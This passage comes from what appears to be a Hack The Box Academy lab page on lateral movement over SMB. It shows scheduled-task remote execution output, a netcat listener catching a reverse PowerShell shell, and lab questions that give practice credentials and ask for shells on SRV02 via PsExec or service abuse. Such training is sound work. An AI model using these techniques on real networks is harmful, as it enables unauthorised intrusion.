[!] This will work ONLY on Windows &gt;= Vista
[*] Creating task \tEQBXeQm
[*] Running task \tEQBXeQm
[*] Deleting task \tEQBXeQm
[*] Attempting to read ADMIN$\Temp\tEQBXeQm.tmp
</code></pre>
<p>We have successfully established a reverse shell connection in our attack box:</p>
<pre><code class="language-shell-session">[!bash!]$ nc -lnvp 8080
Listening on 0.0.0.0 8080
Connection received on 172.20.0.52 50027

PS C:\Windows\system32&gt; 
</code></pre>
<h2>Conclusion</h2>
<p><code>Server Message Block (SMB)</code> is a great protocol for lateral movement within a network. Several advanced techniques exist for achieving remote command execution, service manipulation, and registry access on remote systems, each with unique advantages and methods to avoid detection.</p>
<p>To perform lateral movement using SMB, there are multiple methods, many of which are detailed in this section. In cases where services or named pipes are unavailable, we may need to rely on specific methods such as Scheduled Tasks to acomplish our goals. Understanding these various methods helps us think creatively and adaptively during a penetration test.</p>
<p>In addition, another way to use <code>SMB</code> for lateral movement is through share folders. In the <a href="https://academy.hackthebox.com/course/preview/ntlm-relay-attacks">NTLM Relay module</a>, we covered how we can use different types of files to provoke authentication and perform lateral movement.</p>
<p>In the next section we will focus on WMI for lateral movement.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-success '&gt;low Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="29" value="17">US Academy 6</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="4">US Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="32" value="16">US Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="5">US Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="33" value="13">US Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;US Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="36" value="9">US Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 5 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt; &lt;span class='recommended'&gt; &lt;img src='/images/sparkles-solid.svg'/&gt;Recommended&lt;/span&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="37" value="12">EU Academy 5</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 2 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="38" selected="" value="2">EU Academy 2</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 1 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="40" value="1">EU Academy 1</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 3 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="42" value="14">EU Academy 3</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 4 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="43" value="11">EU Academy 4</option>
<option data-content="&lt;div class='d-flex justify-content-between align-items-center'&gt; &lt;div class='server-title'&gt;EU Academy 6 &lt;/div&gt; &lt;div class='d-flex align-items-center'&gt;  &lt;div class='d-flex align-items-center justify-content-center mr-2 load load-warning '&gt;medium Load  &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;" data-level="47" value="15">EU Academy 6</option>
</select>
<p class="font-size-14 color-white mb-0 mt-2">PROTOCOL</p>
<div class="d-flex">
<div class="custom-control custom-radio custom-control-inline">
<input checked="" class="custom-control-input" id="rd_1" name="vpn-protocol" type="radio" value="udp"/>
<label class="custom-control-label green font-size-14" for="rd_1">UDP
                                    1337</label>
</div>
<div class="custom-control custom-radio">
<input class="custom-control-input" id="rd_2" name="vpn-protocol" type="radio" value="tcp"/>
<label class="custom-control-label green font-size-14" for="rd_2">TCP
                                    443</label>
</div>
</div>
<div class="d-flex justify-content-center">
<button class="btn btn-outline-success btn-lg download-vpn-settings mt-3 px-5 font-size-12">
                                DOWNLOAD VPN CONNECTION FILE
                            </button>
</div>
</div>
</div>
</div>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
<a class="btn btn-light bg-color-blue-nav mt-2 d-flex align-items-center" data-title='Key is already installed in "My Workstation"' data-toggle="tooltip" href="https://academy.hackthebox.com/vpn/key">
<div><i class="fad fa-chart-network mr-2"></i></div>
<div class="text-center w-100">Download VPN Connection File</div>
</a>
</div>
</div>
<div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2465 text-dark"></span> with user "<span class="text-success">Helen</span>" and
                                password "<span class="text-danger">RedRiot88</span>" </p>
<label class="module-question" for="2465"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Use PsExec to get a shell as Helen on SRV02 and read the flag located at C:\Flags\helensonly.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2465" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2465">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2465" id="btnAnswer2465">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2466 text-dark"></span> with user "<span class="text-success">Helen</span>" and
                                password "<span class="text-danger">RedRiot88</span>" </p>
<label class="module-question" for="2466"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Use any tool to get a shell on SRV02 using the service Application Layer Gateway Service (ALG) and read the flag located at C:\Flags\serviceflag.txt:
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2466" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2466">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2466" id="btnAnswer2466">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint2466" data-toggle="modal" id="hintBtn2466"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<p class="mb-0 font-size-12"><i class="fad fa-chart-network text-success mr-2 font-size-medium"></i>
                                Authenticate
                                to <span class="target-protocol-ip target-protocol-ip-2467 text-dark"></span> with user "<span class="text-success">Helen</span>" and
                                password "<span class="text-danger">RedRiot88</span>" </p>
<label class="module-question" for="2467"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Use any tool to get a shell on SRV02 and read the flag located at C:\Users\Administrator\Desktop\flag.txt
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer2467" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-2467">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="2467" id="btnAnswer2467">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Optional Exercises</h4>
<p class="card-title-desc font-size-large font-size-15">
                                Challenge your understanding of the Module content and answer the optional
                                question(s) below. These are considered supplementary content and are not
                                required to complete the Module. You can reveal the answer at any time to check
                                your work.
                            </p>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
</div>
<div>
<div>
<label class="module-question" for="84">Compile NimExec and perform lateral movement using it. Use DONE as the answer when finished.</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="exerciseAnswer84" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswerExercise" data-exercise-id="84" id="btnAnswerExercise84">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                        </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#revealExerciseAnswer84" data-toggle="modal" id="answerExerciseBtn84"><i class="fad fa-life-ring mr-2"></i> Reveal Answer
                                    </button>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
